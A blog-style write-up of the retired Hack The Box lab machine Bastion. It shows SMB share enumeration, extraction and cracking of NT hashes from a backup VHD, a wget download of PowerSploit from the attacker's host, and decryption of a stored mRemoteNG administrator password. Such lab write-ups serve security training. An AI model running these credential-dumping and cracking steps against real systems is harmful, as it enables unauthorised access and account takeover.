---
layout: post
title:  "HTB - Bastion"
date:   2020-06-06 20:00 +0100
tags: writeups
initial: 2019-09-06
---
Writeup for the retired HTB machine Bastion  
Link: https://www.hackthebox.eu/home/machines/profile/186  
IP: 10.10.10.134

<!--more-->

## Recon
A qick portscan reveals multiple open ports:  
```
PORT    STATE SERVICE
22/tcp  open  ssh
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

## SMB
A closer investigation of the SMB service reveals that it is allowing anonymous access with disabled message signing, which in turn enables public enumeration.  
`msf5 > use auxiliary/scanner/smb/pipe_auditor`  
This yields some interesting endpoints: 
```
[+] 10.10.10.134:445      - Pipes: \netlogon, \lsarpc, \samr, \atsvc, \epmapper, \eventlog, \InitShutdown, \lsass, \LSM_API_service, \ntsvcs, \protected_storage, \scerpc, \srvsvc, \trkwks, \W32TIME_ALT, \wkssvc

```
`msf5 > use auxiliary/scanner/smb/smb_enumshares`
```
[-] 10.10.10.134:139      - Login Failed: Unable to Negotiate with remote host
[+] 10.10.10.134:445      - ADMIN$ - (DISK) Remote Admin
[+] 10.10.10.134:445      - Backups - (DISK) 
[+] 10.10.10.134:445      - C$ - (DISK) Default share
[+] 10.10.10.134:445      - IPC$ - (IPC) Remote IPC
```
So let's look into the shares.
First, let's mount the Backups share:  
`sudo mount -t cifs -o user=guest //10.10.10.134/Backups /mnt/`
There's a Backup of a full client machine at `WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351` to be discovered.



## The Backup
This VHD, copied and then mounted on Linux enabled closer investigation:
`sudo guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt/guest/`

With an unbooted Windows installation like this, it is possible to copy registry hives from `C:\Windows\system32\config\` and dump the NTHash for the users:
```
apalax@raudfjorden:~/writeups/HTB/Labs/Bastion$ pwdump SYSTEM SAM 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

```
The syntax for these hashes is `username:id:LM-Hash:NT-Hash`. These are then copied into `hashes.txt` and handed off to john for a dictionary attack:
```
john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
bureaulampje     (L4mpje)
2g 0:00:00:00 DONE (2019-09-05 19:36) 2.222g/s 10439Kp/s 10439Kc/s 10444KC/s burg772v..burdy1
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```
So it seems we have a user login / password combination.  
If we connect via SSH, we're dropped into a CMD (?).  
`user.txt` can be found at the desktop and printed with `type user.txt`.


## Road to root
A try was to make use of Matt Graebers tool, Powersploit. 

First, Powersploit needs to be downloaded:  
`wget http://10.10.15.195:8000/PowerSploit-3.0.0.zip -OutFile ps.zip`  
So download the Privesc folder into the PS Module path, import the module and run:  
```
Import-Module Privesc
Get-Command -Module Privesc
    <available commands>
Invoke-AllChecks
    <stuff stuff>
    (...)

[*] Checking %PATH% for potentially hijackable .dll locations...                                           


HijackablePath : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\                                      
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll' -Command '...'    
```
Which seems to not work. Poking around shows an SSH config file reveals: 
```
Match Group administrators                                                                       
       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys 
```
unfortunately, we don't have write access to that folder as user, so another path for privilege escalation is needed.

### mRemoteNG
A more thorough investigation reveals that mRemoteNG is installed, a remote administration tool.  
On closer examination it is revealed that this software suffers from insecure password storage issues.  
The credentials are stored in a `connection.xml`:
```
PS C:\Users\L4mpje\AppData\Roaming\mRemoteNG> type .\confCons.xml
```
Which can be decrypted with [mremoteng-decrypt](https://github.com/haseebT/mRemoteNG-Decrypt).  
This is done by providing the decrypter the administrator password hash:  
```
python mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
Password: thXLHM96BeKL0ER2
```

This yields the password for the Administrator account. Connect, `cd` to Desktop and print the flag with `type root.txt`.
